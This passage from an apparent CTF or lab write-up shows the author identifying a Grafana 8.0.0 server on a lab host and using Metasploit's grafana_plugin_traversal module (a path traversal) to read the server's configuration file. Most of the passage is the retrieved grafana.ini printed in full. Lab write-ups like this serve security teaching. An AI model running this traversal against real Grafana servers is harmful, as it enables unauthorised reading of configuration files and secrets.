public/app/plugins/panel/table-old/img/icn-table-panel.svg","large":"public/app/plugins/panel/table-old/img/icn-table-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/p  
anel/table-old/module","name":"Table (old)","signature":"internal","skipDataQuery":false,"sort":100,"state":"deprecated"},"text":{"baseUrl":"public/app/plugins/panel/text","hideFromList":false,"id":"text","info  
":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Supports markdown and html content","links":null,"logos":{"small":"public/app/plugins/panel/text/img/icn-text-panel.svg","large":"p  
ublic/app/plugins/panel/text/img/icn-text-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/text/module","name":"Text","signature":"internal","skipDataQuery":true,  
"sort":14,"state":""},"timeseries":{"baseUrl":"public/app/plugins/panel/timeseries","hideFromList":false,"id":"timeseries","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Tim  
e based line, area and bar charts","links":null,"logos":{"small":"public/app/plugins/panel/timeseries/img/icn-timeseries-panel.svg","large":"public/app/plugins/panel/timeseries/img/icn-timeseries-panel.svg"},"b  
uild":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/timeseries/module","name":"Time series","signature":"internal","skipDataQuery":false,"sort":1,"state":""},"welcome":{"baseUrl":  
"public/app/plugins/panel/welcome","hideFromList":true,"id":"welcome","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/pane  
l/welcome/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/welcome/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/welcome/module",  
"name":"Welcome","signature":"internal","skipDataQuery":true,"sort":100,"state":""}},"passwordHint":"password","pluginAdminEnabled":false,"pluginAdminExternalManageEnabled":false,"pluginCatalogURL":"https://gra  
fana.com/grafana/plugins/","pluginsToPreload":[],"rendererAvailable":false,"rendererVersion":"","samlEnabled":false,"sentry":{"enabled":false,"dsn":"","customEndpoint":"/log","sampleRate":1},"sigV4AuthEnabled":  
false,"verifyEmailEnabled":false,"viewersCanEdit":false},  
         navTree: [{"id":"dashboards","text":"Dashboards","subTitle":"Manage dashboards and folders","icon":"apps","url":"/","sortWeight":-1900,"children":[{"id":"home","text":"Home","icon":"home-alt","url":"/  
","hideFromTabs":true},{"id":"divider","text":"Divider","divider":true,"hideFromTabs":true},{"id":"manage-dashboards","text":"Manage","icon":"sitemap","url":"/dashboards"},{"id":"playlists","text":"Playlists","  
icon":"presentation-play","url":"/playlists"}]},{"id":"alerting","text":"Alerting","subTitle":"Alert rules and notifications","icon":"bell","url":"/alerting/list","sortWeight":-1600,"children":[{"id":"alert-lis  
t","text":"Alert rules","icon":"list-ul","url":"/alerting/list"}]},{"id":"help","text":"Help","subTitle":"Grafana v8.0.0 (41f0542c1e)","icon":"question-circle","url":"#","sortWeight":-1200,"hideFromMenu":true}]  
,  
           light: 'public/build/grafana.light.08d1221db5b53eadbfe4.css',  
           dark: 'public/build/grafana.dark.08d1221db5b53eadbfe4.css'
```

Luckily for me, I didn't have to read the whole file, because the version was at the very end : `"subTitle":"Grafana v8.0.0`

```bash
>  msfconsole -q  
msf > search Grafana  
  
Matching Modules  
================  
  
  #  Name                                             Disclosure Date  Rank    Check  Description  
  -  ----                                             ---------------  ----    -----  -----------  
  0  auxiliary/admin/http/grafana_auth_bypass         2019-08-14       normal  No     Grafana 2.0 through 5.2.2 authentication bypass for LDAP and OAuth  
  1  auxiliary/scanner/http/grafana_plugin_traversal  2021-12-02       normal  No     Grafana Plugin Path Traversal  
  
  
Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/grafana_plugin_traversal
```

0 can't be used since it goes from 2.0 through 5.2.2 and the version here is 8.0.0, we will try `auxiliary/scanner/http/grafana_plugin_traversal` .

```bash
msf > use 1  
msf auxiliary(scanner/http/grafana_plugin_traversal) > check  
[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.  
msf auxiliary(scanner/http/grafana_plugin_traversal) > set RHOSTS 10.129.234.47  
RHOSTS => 10.129.234.47  
msf auxiliary(scanner/http/grafana_plugin_traversal) > check  
[-] This module does not support check.  
msf auxiliary(scanner/http/grafana_plugin_traversal) > set LHOST 10.10.14.12  
[!] Unknown datastore option: LHOST. Did you mean VHOST?  
LHOST => 10.10.14.12  
msf auxiliary(scanner/http/grafana_plugin_traversal) > set RPORT 3000  
RPORT => 3000  
msf auxiliary(scanner/http/grafana_plugin_traversal) > run  
[+] Detected vulnerable Grafana: 8.0.0  
[*] 10.129.234.47 - Progress   0/40 (0.0%)  
[+] alertlist was found and exploited successfully  
[+] 10.129.234.47:3000 - File saved in: /home/vagabond/.msf4/loot/20260521100133_default_10.129.234.47_grafana.loot_989095.ini  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
```

Then we read the file :

```bash
>  cat  /home/vagabond/.msf4/loot/20260521100133_default_10.129.234.47_grafana.loot_989095.ini  
  
##################### Grafana Configuration Example #####################  
#  
# Everything has defaults so you only need to uncomment things you want to  
# change  
  
# possible values : production, development  
;app_mode = production  
  
# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty  
;instance_name = ${HOSTNAME}  
  
#################################### Paths ####################################  
[paths]  
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)  
;data = /var/lib/grafana  
  
# Temporary files in `data` directory older than given duration will be removed  
;temp_data_lifetime = 24h  
  
# Directory where grafana can store logs  
;logs = /var/log/grafana  
  
# Directory where grafana will automatically scan and look for plugins  
;plugins = /var/lib/grafana/plugins  
  
# folder that contains provisioning config files that grafana will apply on startup and while running.  
;provisioning = conf/provisioning  
  
#################################### Server ####################################  
[server]  
# Protocol (http, https, h2, socket)  
;protocol = http  
  
# The ip address to bind to, empty will bind to all interfaces  
;http_addr =  
  
# The http port  to use  
;http_port = 3000  
  
# The public facing domain name used to access grafana from a browser  
;domain = localhost  
  
# Redirect to correct domain if host header does not match domain  
# Prevents DNS rebinding attacks  
;enforce_domain = false  
  
# The full public facing url you use in browser, used for redirects and emails  
# If you use reverse proxy and sub path specify full url (with sub path)  
;root_url = %(protocol)s://%(domain)s:%(http_port)s/  
  
# Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons.  
;serve_from_sub_path = false  
  
# Log web requests  
;router_logging = false  
  
# the path relative working path  
;static_root_path = public  
  
# enable gzip  
;enable_gzip = false  
  
# https certs & key file  
;cert_file =  
;cert_key =  
  
# Unix socket path  
;socket =  
  
# CDN Url  
;cdn_url =  
  
# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.  
# `0` means there is no timeout for reading the request.  
;read_timeout = 0  
  
#################################### Database ####################################  
[database]  
# You can configure the database connection by specifying type, host, name, user and password  
# as separate properties or as on string using the url properties.  
  
# Either "mysql", "postgres" or "sqlite3", it's your choice  
;type = sqlite3  
;host = 127.0.0.1:3306  
;name = grafana  
;user = root  
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""  
;password =  
  
# Use either URL or the previous fields to configure the database  
# Example: mysql://user:secret@host:port/database  
;url =  
  
# For "postgres" only, either "disable", "require" or "verify-full"  
;ssl_mode = disable  
  
# Database drivers may support different transaction isolation levels.  
# Currently, only "mysql" driver supports isolation levels.  
# If the value is empty - driver's default isolation level is applied.  
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".  
;isolation_level =  
  
;ca_cert_path =  
;client_key_path =  
;client_cert_path =  
;server_cert_name =  
  
# For "sqlite3" only, path relative to data_path setting  
;path = grafana.db  
  
# Max idle conn setting default is 2  
;max_idle_conn = 2  
  
# Max conn setting default is 0 (mean not set)  
;max_open_conn =  
  
# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)  
;conn_max_lifetime = 14400  
  
# Set to true to log the sql calls and execution times.  
;log_queries =  
  
# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)  
;cache_mode = private  
  
################################### Data sources #########################  
[datasources]  
# Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API.  
;datasource_limit = 5000  
  
#################################### Cache server #############################  
[remote_cache]  
# Either "redis", "memcached" or "database" default is "database"  
;type = database  
  
# cache connectionstring options  
# database: will use Grafana primary database.  
# redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'.  
# memcache: 127.0.0.1:11211  
;connstr =  
  
#################################### Data proxy ###########################  
[dataproxy]  
  
# This enables data proxy logging, default is false  
;logging = false  
  
# How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds.  
# This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set.  
;timeout = 30  
  
# How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds.  
;dialTimeout = 10  
  
# How many seconds the data proxy waits before sending a keepalive probe request.  
;keep_alive_seconds = 30  
  
# How many seconds the data proxy waits for a successful TLS Handshake before timing out.  
;tls_handshake_timeout_seconds = 10  
  
# How many seconds the data proxy will wait for a server's first response headers after  
# fully writing the request headers if the request has an "Expect: 100-continue"  
# header. A value of 0 will result in the body being sent immediately, without  
# waiting for the server to approve.  
;expect_continue_timeout_seconds = 1  
  
# The maximum number of idle connections that Grafana will keep alive.  
;max_idle_connections = 100  
  
# The maximum number of idle connections per host that Grafana will keep alive.  
;max_idle_connections_per_host = 2  
  
# How many seconds the data proxy keeps an idle connection open before timing out.  
;idle_conn_timeout_seconds = 90  
  
# If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false.  
;send_user_header = false  
  
#################################### Analytics ####################################  
[analytics]  
# Server reporting, sends usage counters to stats.grafana.org every 24 hours.  
# No ip addresses are being tracked, only simple counters to track  
# running instances, dashboard and error counts. It is very helpful to us.  
# Change this option to false to disable reporting.  
;reporting_enabled = true  
  
# The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs  
;reporting_distributor = grafana-labs  
  
# Set to false to disable all checks to https://grafana.net  
# for new versions (grafana itself and plugins), check is used  
# in some UI views to notify that grafana or plugin update exists  
# This option does not cause any auto updates, nor send any information  
# only a GET request to http://grafana.com to get latest versions  
;check_for_updates = true  
  
# Google Analytics universal tracking code, only enabled if you specify an id here  
;google_analytics_ua_id =  
  
# Google Tag Manager ID, only enabled if you specify an id here  
;google_tag_manager_id =  
  
#################################### Security ####################################  
[security]  
# disable creation of admin user on first start of grafana  
;disable_initial_admin_creation = false  
  
# default admin user, created on startup  
;admin_user = admin  
  
# default admin password, can be changed before first start of grafana,  or in profile settings  
;admin_password = admin  
  
# used for signing  
;secret_key = SW2YcwTIb9zpOOhoPsMm  
  
# disable gravatar profile images  
;disable_gravatar = false  
  
# data source proxy whitelist (ip_or_domain:port separated by spaces)  
;data_source_proxy_whitelist =  
  
# disable protection against brute force login attempts  
;disable_brute_force_login_protection = false  
  
# set to true if you host Grafana behind HTTPS. default is false.  
;cookie_secure = false  
  
# set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled"  
;cookie_samesite = lax  
  
# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.  
;allow_embedding = false  
  
# Set to true if you want to enable http strict transport security (HSTS) response header.  
# This is only sent when HTTPS is enabled in this configuration.  
# HSTS tells browsers that the site should only be accessed using HTTPS.  
;strict_transport_security = false  
  
# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.  
;strict_transport_security_max_age_seconds = 86400  
  
# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.  
;strict_transport_security_preload = false  
  
# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.  
;strict_transport_security_subdomains = false  
  
# Set to true to enable the X-Content-Type-Options response header.  
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised  
# in the Content-Type headers should not be changed and be followed.  
;x_content_type_options = true  
  
# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading  
# when they detect reflected cross-site scripting (XSS) attacks.  
;x_xss_protection = true  
  
# Enable adding the Content-Security-Policy header to your requests.  
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.  
;content_security_policy = false  
  
# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.  
# $NONCE in the template includes a random nonce.  
# $ROOT_PATH is server.root_url without the protocol.  
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri '  
self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""  
  
#################################### Snapshots ###########################  
[snapshots]  
# snapshot sharing options  
;external_enabled = true  
;external_snapshot_url = https://snapshots-origin.raintank.io  
;external_snapshot_name = Publish to snapshot.raintank.io  
  
# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for  
# creating and deleting snapshots.  
;public_mode = false  
  
# remove expired snapshot  
;snapshot_remove_expired = true  
  
#################################### Dashboards History ##################  
[dashboards]  
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1  
;versions_to_keep = 20  
  
# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.  
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.  
;min_refresh_interval = 5s  
  
# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"  
;default_home_dashboard_path =  
  
#################################### Users ###############################  
[users]  
# disable user signup / registration  
;allow_sign_up = true  
  
# Allow non admin users to create organizations  
;allow_org_create = true  
  
# Set to true to automatically assign new users to the default organization (id 1)  
;auto_assign_org = true  
  
# Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true)  
;auto_assign_org_id = 1  
  
# Default role new users will be automatically assigned (if disabled above is set to true)  
;auto_assign_org_role = Viewer  
  
# Require email validation before sign up completes  
;verify_email_enabled = false  
  
# Background text for the user field on the login page  
;login_hint = email or username  
;password_hint = password  
  
# Default UI theme ("dark" or "light")  
;default_theme = dark  
  
# Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash.  
; home_page =  
  
# External user management, these options affect the organization users view  
;external_manage_link_url =  
;external_manage_link_name =  
;external_manage_info =  
  
# Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard.  
;viewers_can_edit = false  
  
# Editors can administrate dashboard, folders and teams they create  
;editors_can_admin = false  
  
# The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum support  
ed duration is 15m (15 minutes).  
;user_invite_max_lifetime_duration = 24h  
  
# Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves.  
; hidden_users =  
  
[auth]  
# Login cookie name  
;login_cookie_name = grafana_session  
  
# The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6  
h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation.  
;login_maximum_inactive_lifetime_duration =  
  
# The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minut  
es), 6h (hours), 10d (days), 2w (weeks), 1M (month).  
;login_maximum_lifetime_duration =  
  
# How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes.  
;token_rotation_interval_minutes = 10  
  
# Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false  
;disable_login_form = false  
  
# Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false  
;disable_signout_menu = false  
  
# URL to redirect the user to after sign out  
;signout_redirect_url =  
  
# Set to true to attempt login with OAuth automatically, skipping the login screen.  
# This setting is ignored if multiple OAuth providers are configured.  
;oauth_auto_login = false  
  
# OAuth state max age cookie duration in seconds. Defaults to 600 seconds.  
;oauth_state_cookie_max_age = 600  
  
# limit of api_key seconds to live before expiration  
;api_key_max_seconds_to_live = -1  
  
# Set to true to enable SigV4 authentication option for HTTP-based datasources.  
;sigv4_auth_enabled = false  
  
#################################### Anonymous Auth ######################  
[auth.anonymous]  
# enable anonymous access  
;enabled = false  
  
# specify organization name that should be used for unauthenticated users  
;org_name = Main Org.  
  
# specify role for unauthenticated users  
;org_role = Viewer  
  
# mask the Grafana version number for unauthenticated users  
;hide_version = false  
  
#################################### GitHub Auth ##########################  
[auth.github]  
;enabled = false  
;allow_sign_up = true  
;client_id = some_id  
;client_secret = some_secret  
;scopes = user:email,read:org  
;auth_url = https://github.com/login/oauth/authorize  
;token_url = https://github.com/login/oauth/access_token  
;api_url = https://api.github.com/user  
;allowed_domains =  
;team_ids =  
;allowed_organizations =  
  
#################################### GitLab Auth #########################  
[auth.gitlab]  
;enabled = false  
;allow_sign_up = true  
;client_id = some_id  
;client_secret = some_secret  
;scopes = api  
;auth_url = https://gitlab.com/oauth/authorize  
;token_url = https://gitlab.com/oauth/token  
;api_url = https://gitlab.com/api/v4  
;allowed_domains =  
;allowed_groups =  
  
#################################### Google Auth ##########################  
[auth.google]  
;enabled = false  
;allow_sign_up = true  
;client_id = some_client_id  
;client_secret = some_client_secret  
;scopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email  
;auth_url = https://accounts.google.com/o/oauth2/auth  
;token_url = https://accounts.google.com/o/oauth2/token  
;api_url = https://www.googleapis.com/oauth2/v1/userinfo  
;allowed_domains =  
;hosted_domain =  
  
#################################### Grafana.com Auth ####################  
[auth.grafana_com]  
;enabled = false  
;allow_sign_up = true  
;client_id = some_id  
;client_secret = some_secret  
;scopes = user:email  
;allowed_organizations =  
  
#################################### Azure AD OAuth #######################  
[auth.azuread]  
;name = Azure AD  
;enabled = false  
;allow_sign_up = true  
;client_id = some_client_id  
;client_secret = some_client_secret  
;scopes = openid email profile  
;auth_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize  
;token_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token  
;allowed_domains =  
;allowed_groups =  
  
#################################### Okta OAuth #######################  
[auth.okta]  
;name = Okta  
;enabled = false  
;allow_sign_up = true  
;client_id = some_id  
;client_secret = some_secret  
;scopes = openid profile email groups  
;auth_url = https://<tenant-id>.okta.com/oauth2/v1/authorize  
;token_url = https://<tenant-id>.okta.com/oauth2/v1/token  
;api_url = https://<tenant-id>.okta.com/oauth2/v1/userinfo  
;allowed_domains =  
;allowed_groups =  
;role_attribute_path =  
;role_attribute_strict = false  
  
#################################### Generic OAuth ##########################  
[auth.generic_oauth]  
;enabled = false  
;name = OAuth  
;allow_sign_up = true  
;client_id = some_id  
;client_secret = some_secret  
;scopes = user:email,read:org  
;empty_scopes = false  
;email_attribute_name = email:primary  
;email_attribute_path =  
;login_attribute_path =  
;name_attribute_path =  
;id_token_attribute_name =  
;auth_url = https://foo.bar/login/oauth/authorize  
;token_url = https://foo.bar/login/oauth/access_token  
;api_url = https://foo.bar/user  
;allowed_domains =  
;team_ids =  
;allowed_organizations =  
;role_attribute_path =  
;role_attribute_strict = false  
;tls_skip_verify_insecure = false  
;tls_client_cert =  
;tls_client_key =  
;tls_client_ca =  
  
#################################### Basic Auth ##########################  
[auth.basic]  
;enabled = true  
  
#################################### Auth Proxy ##########################  
[auth.proxy]  
;enabled = false  
;header_name = X-WEBAUTH-USER  
;header_property = username  
;auto_sign_up = true  
;sync_ttl = 60  
;whitelist = 192.168.1.1, 192.168.2.1  
;headers = Email:X-User-Email, Name:X-User-Name  
# Read the auth proxy docs for details on what the setting below enables  
;enable_login_token = false  
  
#################################### Auth JWT ##########################  
[auth.jwt]  
;enabled = true  
;header_name = X-JWT-Assertion  
;email_claim = sub  
;username_claim = sub  
;jwk_set_url = https://foo.bar/.well-known/jwks.json  
;jwk_set_file = /path/to/jwks.json  
;cache_ttl = 60m  
;expected_claims = {"aud": ["foo", "bar"]}  
;key_file = /path/to/key/file  
  
#################################### Auth LDAP ##########################  
[auth.ldap]  
;enabled = false  
;config_file = /etc/grafana/ldap.toml  
;allow_sign_up = true  
  
# LDAP background sync (Enterprise only)  
# At 1 am every day  
;sync_cron = "0 0 1 * * *"  
;active_sync_enabled = true  
  
#################################### AWS ###########################  
[aws]  
# Enter a comma-separated list of allowed AWS authentication providers.  
# Options are: default (AWS SDK Default), keys (Access && secret key), credentials (Credentials field), ec2_iam_role (EC2 IAM Role)  
; allowed_auth_providers = default,keys,credentials  
  
# Allow AWS users to assume a role using temporary security credentials.  
# If true, assume role will be enabled for all AWS authentication providers that are specified in aws_auth_providers  
; assume_role_enabled = true  
  
#################################### Azure ###############################  
[azure]  
# Azure cloud environment where Grafana is hosted  
# Possible values are AzureCloud, AzureChinaCloud, AzureUSGovernment and AzureGermanCloud  
# Default value is AzureCloud (i.e. public cloud)  
;cloud = AzureCloud  
  
# Specifies whether Grafana hosted in Azure service with Managed Identity configured (e.g. Azure Virtual Machines instance)  
# If enabled, the managed identity can be used for authentication of Grafana in Azure services  
# Disabled by default, needs to be explicitly enabled  
;managed_identity_enabled = false  
  
# Client ID to use for user-assigned managed identity  
# Should be set for user-assigned identity and should be empty for system-assigned identity  
;managed_identity_client_id =  
  
#################################### SMTP / Emailing ##########################  
[smtp]  
;enabled = false  
;host = localhost:25  
;user =  
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""  
;password =  
;cert_file =  
;key_file =  
;skip_verify = false  
;from_address = admin@grafana.localhost  
;from_name = Grafana  
# EHLO identity in SMTP dialog (defaults to instance_name)  
;ehlo_identity = dashboard.example.com  
# SMTP startTLS policy (defaults to 'OpportunisticStartTLS')  
;startTLS_policy = NoStartTLS  
  
[emails]  
;welcome_email_on_sign_up = false  
;templates_pattern = emails/*.html  
  
#################################### Logging ##########################  
[log]  
# Either "console", "file", "syslog". Default is console and  file  
# Use space to separate multiple modes, e.g. "console file"  
;mode = console file  
  
# Either "debug", "info", "warn", "error", "critical", default is "info"  
;level = info  
  
# optional settings to set different levels for specific loggers. Ex filters = sqlstore:debug  
;filters =  
  
# For "console" mode only  
[log.console]  
;level =  
  
# log line format, valid options are text, console and json  
;format = console  
  
# For "file" mode only  
[log.file]  
;level =  
  
# log line format, valid options are text, console and json  
;format = text  
  
# This enables automated log rotate(switch of following options), default is true  
;log_rotate = true  
  
# Max line number of single file, default is 1000000  
;max_lines = 1000000  
  
# Max size shift of single file, default is 28 means 1 << 28, 256MB  
;max_size_shift = 28  
  
# Segment log daily, default is true  
;daily_rotate = true  
  
# Expired days of log file(delete after max days), default is 7  
;max_days = 7  
  
[log.syslog]  
;level =  
  
# log line format, valid options are text, console and json  
;format = text  
  
# Syslog network type and address. This can be udp, tcp, or unix. If left blank, the default unix endpoints will be used.  
;network =  
;address =  
  
# Syslog facility. user, daemon and local0 through local7 are valid.  
;facility =  
  
# Syslog tag. By default, the process' argv[0] is used.  
;tag =  
  
[log.frontend]  
# Should Sentry javascript agent be initialized  
;enabled = false  
  
# Sentry DSN if you want to send events to Sentry.  
;sentry_dsn =  
  
# Custom HTTP endpoint to send events captured by the Sentry agent to. Default will log the events to stdout.  
;custom_endpoint = /log  
  
# Rate of events to be reported between 0 (none) and 1 (all), float  
;sample_rate = 1.0  
  
# Requests per second limit enforced an extended period, for Grafana backend log ingestion endpoint (/log).  
;log_endpoint_requests_per_second_limit = 3  
  
# Max requests accepted per short interval of time for Grafana backend log ingestion endpoint (/log).  
;log_endpoint_burst_limit = 15  
  
#################################### Usage Quotas ########################  
[quota]  
; enabled = false  
  
#### set quotas to -1 to make unlimited. ####  
# limit number of users per Org.  
; org_user = 10  
  
# limit number of dashboards per Org.  
; org_dashboard = 100  
  
# limit number of data_sources per Org.  
; org_data_source = 10  
  
# limit number of api_keys per Org.  
; org_api_key = 10  
  
# limit number of alerts per Org.  
;org_alert_rule = 100  
  
# limit number of orgs a user can create.  
; user_org = 10  
  
# Global limit of users.  
; global_user = -1  
  
# global limit of orgs.  
; global_org = -1  
  
# global limit of dashboards  
; global_dashboard = -1  
  
# global limit of api_keys  
; global_api_key = -1  
  
# global limit on number of logged in users.  
; global_session = -1  
  
# global limit of alerts  
;global_alert_rule = -1  
  
#################################### Alerting ############################  
[alerting]  
# Disable alerting engine & UI features  
;enabled = true  
# Makes it possible to turn off alert rule execution but alerting UI is visible  
;execute_alerts = true  
  
# Default setting for new alert rules. Defaults to categorize error and timeouts as alerting. (alerting, keep_state)  
;error_or_timeout = alerting  
  
# Default setting for how Grafana handles nodata or null values in alerting. (alerting, no_data, keep_state, ok)  
;nodata_or_nullvalues = no_data  
  
# Alert notifications can include images, but rendering many images at the same time can overload the server  
# This limit will protect the server from render overloading and make sure notifications are sent out quickly  
;concurrent_render_limit = 5  
  
  
# Default setting for alert calculation timeout. Default value is 30  
;evaluation_timeout_seconds = 30  
  
# Default setting for alert notification timeout. Default value is 30  
;notification_timeout_seconds = 30  
  
# Default setting for max attempts to sending alert notifications. Default value is 3  
;max_attempts = 3  
  
# Makes it possible to enforce a minimal interval between evaluations, to reduce load on the backend  
;min_interval_seconds = 1  
  
# Configures for how long alert annotations are stored. Default is 0, which keeps them forever.  
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).  
;max_annotation_age =  
  
# Configures max number of alert annotations that Grafana stores. Default value is 0, which keeps all alert annotations.  
;max_annotations_to_keep =  
  
#################################### Annotations #########################  
[annotations]  
# Configures the batch size for the annotation clean-up job. This setting is used for dashboard, API, and alert annotations.  
;cleanupjob_batchsize = 100  
  
[annotations.dashboard]  
# Dashboard annotations means that annotations are associated with the dashboard they are created on.  
  
# Configures how long dashboard annotations are stored. Default is 0, which keeps them forever.  
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).  
;max_age =  
  
# Configures max number of dashboard annotations that Grafana stores. Default value is 0, which keeps all dashboard annotations.  
;max_annotations_to_keep =  
  
[annotations.api]  
# API annotations means that the annotations have been created using the API without any  
# association with a dashboard.  
  
# Configures how long Grafana stores API annotations. Default is 0, which keeps them forever.  
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).  
;max_age =  
  
# Configures max number of API annotations that Grafana keeps. Default value is 0, which keeps all API annotations.  
;max_annotations_to_keep =  
  
#################################### Explore #############################  
[explore]  
# Enable the Explore section  
;enabled = true  
  
#################################### Internal Grafana Metrics ##########################  
# Metrics available at HTTP API Url /metrics  
[metrics]  
# Disable / Enable internal metrics  
;enabled           = true  
# Graphite Publish interval  
;interval_seconds  = 10  
# Disable total stats (stat_totals_*) metrics to be generated  
;disable_total_stats = false  
  
#If both are set, basic auth will be required for the metrics endpoint.  
; basic_auth_username =  
; basic_auth_password =  
  
# Metrics environment info adds dimensions to the `grafana_environment_info` metric, which  
# can expose more information about the Grafana instance.  
[metrics.environment_info]  
#exampleLabel1 = exampleValue1  
#exampleLabel2 = exampleValue2  
  
# Send internal metrics to Graphite  
[metrics.graphite]  
# Enable by setting the address setting (ex localhost:2003)  
;address =  
;prefix = prod.grafana.%(instance_name)s.  
  
#################################### Grafana.com integration  ##########################  
# Url used to import dashboards directly from Grafana.com  
[grafana_com]  
;url = https://grafana.com  
  
#################################### Distributed tracing ############  
[tracing.jaeger]  
# Enable by setting the address sending traces to jaeger (ex localhost:6831)  
;address = localhost:6831  
# Tag that will always be included in when creating new spans. ex (tag1:value1,tag2:value2)  
;always_included_tag = tag1:value1  
# Type specifies the type of the sampler: const, probabilistic, rateLimiting, or remote  
;sampler_type = const  
# jaeger samplerconfig param  
# for "const" sampler, 0 or 1 for always false/true respectively  
# for "probabilistic" sampler, a probability between 0 and 1  
# for "rateLimiting" sampler, the number of spans per second  
# for "remote" sampler, param is the same as for "probabilistic"  
# and indicates the initial sampling rate before the actual one  
# is received from the mothership  
;sampler_param = 1  
# sampling_server_url is the URL of a sampling manager providing a sampling strategy.  
;sampling_server_url =  
# Whether or not to use Zipkin propagation (x-b3- HTTP headers).  
;zipkin_propagation = false  
# Setting this to true disables shared RPC spans.  
# Not disabling is the most common setting when using Zipkin elsewhere in your infrastructure.  
;disable_shared_zipkin_spans = false  
  
#################################### External image storage ##########################  
[external_image_storage]  
# Used for uploading images to public servers so they can be included in slack/email messages.  
# you can choose between (s3, webdav, gcs, azure_blob, local)  
;provider =  
  
[external_image_storage.s3]  
;endpoint =  
;path_style_access =  
;bucket =  
;region =  
;path =  
;access_key =  
;secret_key =  
  
[external_image_storage.webdav]  
;url =  
;public_url =  
;username =  
;password =  
  
[external_image_storage.gcs]  
;key_file =  
;bucket =  
;path =  
  
[external_image_storage.azure_blob]  
;account_name =  
;account_key =  
;container_name =  
  
[external_image_storage.local]  
# does not require any configuration  
  
[rendering]  
# Options to configure a remote HTTP image rendering service, e.g. using https://github.com/grafana/grafana-image-renderer.  
# URL to a remote HTTP image renderer service, e.g. http://localhost:8081/render, will enable Grafana to render panels and dashboards to PNG-images using HTTP requests to an external service.  
;server_url =  
# If the remote HTTP image renderer service runs on a different server than the Grafana server you may have to configure this to a URL where Grafana is reachable, e.g. http://grafana.domain/.  
;callback_url =  
# Concurrent render request limit affects when the /render HTTP endpoint is used. Rendering many images at the same time can overload the server,  
# which this setting can help protect against by only allowing a certain amount of concurrent requests.  
;concurrent_render_request_limit = 30  
  
[panels]  
